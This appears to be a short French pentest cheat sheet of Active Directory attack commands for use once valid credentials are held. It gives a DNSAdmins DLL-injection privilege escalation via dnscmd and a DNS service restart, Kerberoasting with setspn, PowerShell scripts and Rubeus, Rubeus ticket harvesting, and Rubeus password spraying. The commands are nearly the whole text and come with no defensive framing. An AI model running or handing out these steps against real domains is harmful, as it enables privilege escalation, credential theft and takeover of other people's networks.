
Utiliser après avoir un couple d'identifiant correct


#DLL-Hijacking 

L'attaque est possible si un utilisateur du Domain fait partie du groupe `DNSAdmin`
- Créer le payload DLL avec msfvenom et lancer un écouteur
- Se connecter au compte d'utilisateur et transféré la DLL
- Injecter la dll dans le processus système:

```sh
dnscmd /config /serverlevelplugindll C:\Temp\evil.dll

sc stop dns

sc start dns
```


#Kerberoasting

Acceder au system compromis et chercher les SPN vulnerables

```c
. .\Find-PotentiallyCrackableAccounts.ps1

Find-PotentiallyCrackableAccounts
```

```c
setspn.exe -Q */*
```

Demander un ticket pour le TGS

```c
. .\Get-TGSCipher.ps1
Get-TGSCipher -SPN "SPN" -Format john
```

```c
rubeus.exe kerberoast /outfile:hash.txt
```

#Harvesting

La récolte rassemble les tickets qui sont transférés vers le KDC et les enregistre pour les utiliser dans d'autres attaques telles que l'attaque par passe le ticket.

Cette commande indique à Rubeus de récolter des TGT toutes les 30 secondes

```c
Rubeus.exe harvest /interval:30
```

#Password-Spraying

Avant de pulvériser le mot de passe avec Rubeus, vous devez ajouter le nom de domaine du contrôleur de domaine au fichier hôte Windows.
Cela prendra un mot de passe donné et le "pulvérisera" contre tous les utilisateurs trouvés, puis donnera le `.kirbi` TGT pour cet utilisateur

```c
Rubeus.exe brute /password:<YOU_PASSWD> /noticket
```